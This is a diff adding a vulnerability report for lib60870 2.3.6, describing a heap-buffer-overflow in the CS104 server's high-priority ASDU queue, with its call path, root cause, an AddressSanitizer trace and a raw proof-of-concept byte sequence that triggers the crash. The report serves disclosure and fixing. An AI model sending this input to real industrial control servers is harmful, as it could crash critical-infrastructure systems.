@@ -1,0 +1,29 @@
+issue #196
+
+Summary
+I found a heap-buffer-overflow in the CS104 server-side code of lib60870 2.3.6.
+
+The crash occurs in:
+
+HighPriorityASDUQueue_hasUnconfirmedIMessages()
+and is reached through the server-side path:
+
+handleMessage()
+MasterConnection_hasUnconfirmedMessages()
+HighPriorityASDUQueue_hasUnconfirmedIMessages()
+Based on debugging, the root cause appears to be a format mismatch in the high-priority ASDU queue:
+
+HighPriorityASDUQueue_enqueue() stores entries as:
+uint16_t msgSize
+followed by encoded ASDU bytes
+HighPriorityASDUQueue_hasUnconfirmedIMessages() later traverses the same queue as if each entry begins with a struct sMessageQueueEntryInfo
+As a result, serialized ASDU payload bytes are later misinterpreted as queue-entry metadata. This can produce a bogus entryInfo.size, causing queue traversal to skip past lastEntry and continue reading non-entry data until an out-of-bounds read occurs.
+
+
+Actual Behavior If Applicable
+==111155==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x51e000001694 at pc 0x56e64860c987 bp 0x74d1424f4c20 sp 0x74d1424f4c18
+
+PoC
+
+<68><04><07><30><30><30><68><23><00><00><00><00><64><30><06><30><30><00><00><00><00><14><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><1a><68><21><02><00><00><00><64><30><06><30><30><00><00><00><00><14><30><04><30><30><30><30><30><30><30><30><30><30><30><30><68><30><30><68><30><68><68><04><00><00><00><64><30><06><30><30><30><00><00><00><14><30><04><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><00><30><30><30><30><30><02><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><68><04><1b><30><30><30>
+
